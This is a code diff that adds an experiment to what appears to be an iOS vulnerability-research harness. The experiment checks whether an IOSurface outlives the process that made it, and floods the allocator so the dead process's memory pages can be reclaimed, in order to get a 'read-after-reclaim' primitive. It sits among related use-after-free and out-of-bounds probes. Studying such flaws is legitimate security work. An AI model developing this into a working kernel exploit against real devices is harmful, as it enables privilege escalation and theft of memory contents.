@@ -24097,6 +24097,172 @@ static void p_victim(void) {
 }
 
 
+// V157 (p_persist): does a sel7 client-memory surface outlive its task?
+//
+// v156 established that a second TASK cannot be produced from one sandboxed
+// bundle — posix_spawn is EPERM, XPC service APIs are not exported on iOS,
+// fork() is EPERM. That was an obstacle only to *simultaneous* two-process
+// testing. The property we actually need is about LIFETIME, and lifetime can
+// be tested across two SEQUENTIAL launches of the same binary: the app
+// container in Documents/ survives process death, so:
+//
+//   launch 1 (p_persist step=make): create the sel7 alias over our pages,
+//     fill it with a marker, write the sid to Documents/sid.txt, exit.
+//   launch 2 (p_persist step=take): a DIFFERENT process (new pid, new task)
+//     reads sid.txt, immediately floods the general allocator with the SAME
+//     size class so it can grab the dead task's pages, then locks the surface
+//     and reports what the marker bytes became.
+//
+// The flood-before-read ordering is the whole experiment: if the victim task's
+// pages went back to the common allocator, our own allocations are the most
+// likely new owners, and we will see our own pattern where 0x5A used to be.
+// GPU DATA pages were never reachable this way (§134/§135: scrubbed, and the
+// PT pools are driver-internal) — ordinary client pages are neither.
+static void p_persist(void) {
+    int step = atoi(getenv("FUZZ_PERSIST_STEP") ?: "1");
+    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+    NSString *sidfile = [docs stringByAppendingPathComponent:@"sid.txt"];
+    size_t sz = 0x40000;
+    const uint8_t MARK = 0x5A;
+
+    io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+    if (!s) { LOG("[ps] no IOSurfaceRoot"); LOG("[ps] done"); return; }
+    io_connect_t uc = 0;
+    kern_return_t ok = IOServiceOpen(s, mach_task_self(), 0, &uc);
+    IOObjectRelease(s);
+    if (ok || !uc) { LOG("[ps] open failed 0x%08x", ok); LOG("[ps] done"); return; }
+
+    if (step == 1) {
+        // ---- MAKE: alias our own pages, publish the sid, then die.
+        vm_address_t a = 0;
+        if (vm_allocate(mach_task_self(), &a, sz, VM_FLAGS_ANYWHERE)) {
+            LOG("[ps] vm_allocate failed"); LOG("[ps] done"); return;
+        }
+        uint8_t *buf = (uint8_t *)a;
+        for (size_t i = 0; i < sz; i++) buf[i] = MARK;
+        uint8_t *outb = calloc(1, 0x2000);
+        uint64_t sc[2] = { (uint64_t)a, (uint64_t)sz };
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+        kern_return_t kr = IOConnectCallMethod(uc, 7, sc, 2, NULL, 0,
+                                               osc, &nosc, outb, &osz);
+        uint32_t sid = *(uint32_t *)(outb + 0x18);
+        LOG("[ps] MAKE: sel7 -> kr 0x%08x sid %u (base %p size 0x%zx marker 0x%02x)",
+            kr, sid, buf, sz, MARK);
+        free(outb);
+        fsync(fileno(stderr));
+        if (kr || !sid) { LOG("[ps] MAKE failed"); LOG("[ps] done"); return; }
+        // CONTROL: confirm the alias is live before we publish anything.
+        {
+            uint8_t *ib = must_map(0x1000), *ob = must_map(0x2000);
+            memset(ib, 0, 0x1000);
+            *(uint32_t *)(ib + 0) = sid;
+            *(uint64_t *)(ib + 4) = 0;
+            memset(ob, 0, 0x2000);
+            osz = 3176; nosc = 0;
+            kern_return_t kl = IOConnectCallMethod(uc, 2, NULL, 0, ib, 12,
+                                                   osc, &nosc, ob, &osz);
+            long mk = 0;
+            if (!kl) {
+                uint64_t w[6];
+                for (int i = 0; i < 6; i++) w[i] = *(uint64_t *)(ob + i * 8);
+                uint8_t *sb = (uint8_t *)(uintptr_t)w[0];
+                long lim = (long)(w[4] < sz ? w[4] : sz);
+                for (long i = 0; i < lim && sb; i++) if (sb[i] == MARK) mk++;
+                LOG("[ps] MAKE control: lock -> kr 0x%08x, base %p, marker %ld/%ld %s",
+                    kl, sb, mk, lim, mk > lim/2 ? "(alias live)" : "(ALIAS BROKEN)");
+            }
+            vm_deallocate(mach_task_self(), (vm_address_t)ib, 0x1000);
+            vm_deallocate(mach_task_self(), (vm_address_t)ob, 0x2000);
+        }
+        // Publish the sid so the NEXT process can find it. NSString, not NSNumber:
+        // NSNumber has no file-writing API.
+        [[NSString stringWithFormat:@"%u", sid] writeToFile:sidfile
+                                                 atomically:YES
+                                                   encoding:NSUTF8StringEncoding
+                                                      error:nil];
+        LOG("[ps] MAKE: sid %u written to %@ — now dying", sid, sidfile.lastPathComponent);
+        fsync(fileno(stderr));
+        IOServiceClose(uc);
+        return;   // process exits; the surface must outlive us
+    }
+
+    // ---- TAKE: we are a new process. The previous task is dead.
+    {
+        NSString *txt = [NSString stringWithContentsOfFile:sidfile
+                                                   encoding:NSUTF8StringEncoding error:nil];
+        if (!txt.length) {
+            LOG("[ps] TAKE: no sid file — run step=make first");
+            LOG("[ps] done");
+            return;
+        }
+        uint32_t sid = (uint32_t)txt.integerValue;
+        LOG("[ps] TAKE: new pid %d, reading sid %u left by the dead task", getpid(), sid);
+        fsync(fileno(stderr));
+
+        // Flood the allocator BEFORE touching the surface: the dead task's pages
+        // should be free right now, and same-size allocations are the most
+        // likely new owners.
+        NSMutableArray *flood = [NSMutableArray array];
+        uint8_t floodmark = 0xC3;
+        for (int i = 0; i < 64; i++) {
+            uint8_t *b = malloc(sz);
+            if (b) { memset(b, floodmark, sz); [flood addObject:[NSValue valueWithPointer:b]]; }
+        }
+        LOG("[ps] TAKE: flooded allocator with %lu x 0x%zx blocks of 0x%02x",
+            (unsigned long)[flood count], sz, floodmark);
+        fsync(fileno(stderr));
+
+        uint8_t *inb = must_map(0x1000), *outb = must_map(0x2000);
+        memset(inb, 0, 0x1000);
+        *(uint32_t *)(inb + 0) = sid;
+        *(uint64_t *)(inb + 4) = 0;
+        memset(outb, 0, 0x2000);
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+        kern_return_t kl = IOConnectCallMethod(uc, 2, NULL, 0, inb, 12,
+                                               osc, &nosc, outb, &osz);
+        LOG("[ps] TAKE: lock sid %u after its creator died -> kr 0x%08x", sid, kl);
+        if (!kl) {
+            uint64_t w[6];
+            for (int i = 0; i < 6; i++) w[i] = *(uint64_t *)(outb + i * 8);
+            uint8_t *sbuf = (uint8_t *)(uintptr_t)w[0];
+            long lim = (long)(w[4] < sz ? w[4] : sz);
+            long m5a = 0, mC3 = 0, zero = 0, other = 0;
+            for (long i = 0; i < lim && sbuf; i++) {
+                uint8_t v = sbuf[i];
+                if (v == MARK) m5a++;
+                else if (v == floodmark) mC3++;
+                else if (!v) zero++;
+                else other++;
+            }
+            LOG("[ps] TAKE: base %p alloc %llu", sbuf, (unsigned long long)w[4]);
+            LOG("[ps] TAKE: victim 0x%02x %ld | ours 0x%02x %ld | zero %ld | other %ld (of %ld)",
+                MARK, m5a, floodmark, mC3, zero, other, lim);
+            if (m5a > lim / 2)
+                LOG("[ps] VERDICT: *** SURFACE OUTLIVED ITS TASK, PAGES INTACT ***");
+            else if (mC3 > lim / 2)
+                LOG("[ps] VERDICT: *** PAGES RECYCLED INTO OUR OWN ALLOCATION — "
+                    "read-after-reclaim primitive, content controllable ***");
+            else if (m5a + mC3 < lim / 2)
+                LOG("[ps] VERDICT: surface alive, pages in an unknown third party state");
+            if (sbuf && other) {
+                LOG("[ps] first 24 bytes:");
+                for (int i = 0; i < 24; i += 4)
+                    LOG("[ps]   +%02d: %02x %02x %02x %02x", i,
+                        sbuf[i], sbuf[i+1], sbuf[i+2], sbuf[i+3]);
+            }
+        } else {
+            LOG("[ps] VERDICT: surface did NOT survive its task (kr 0x%08x) — "
+                "lifetime bound to the creator", kl);
+        }
+        vm_deallocate(mach_task_self(), (vm_address_t)inb, 0x1000);
+        vm_deallocate(mach_task_self(), (vm_address_t)outb, 0x2000);
+        (void)flood;
+    }
+    IOServiceClose(uc);
+    LOG("[ps] done");
+}
+
 // V152 (p_mempool): IOSurfaceRootUserClient sel49-52 — the memory pool.
 // This is the one userclient path that allocates kernel-side pooled memory
 // sized by request, i.e. the classic under-allocation -> out-of-bounds write
@@ -26441,6 +26607,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_AFTERDEATH")) { p_afterdeath(); LOG("[probe13] afterdeath-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GSURV")) { p_gsurvive(); LOG("[probe13] gsurv-only mode, stop"); return NULL; }
         if (getenv("FUZZ_VICTIM")) { p_victim(); LOG("[probe13] victim-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_PERSIST")) { p_persist(); LOG("[probe13] persist-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
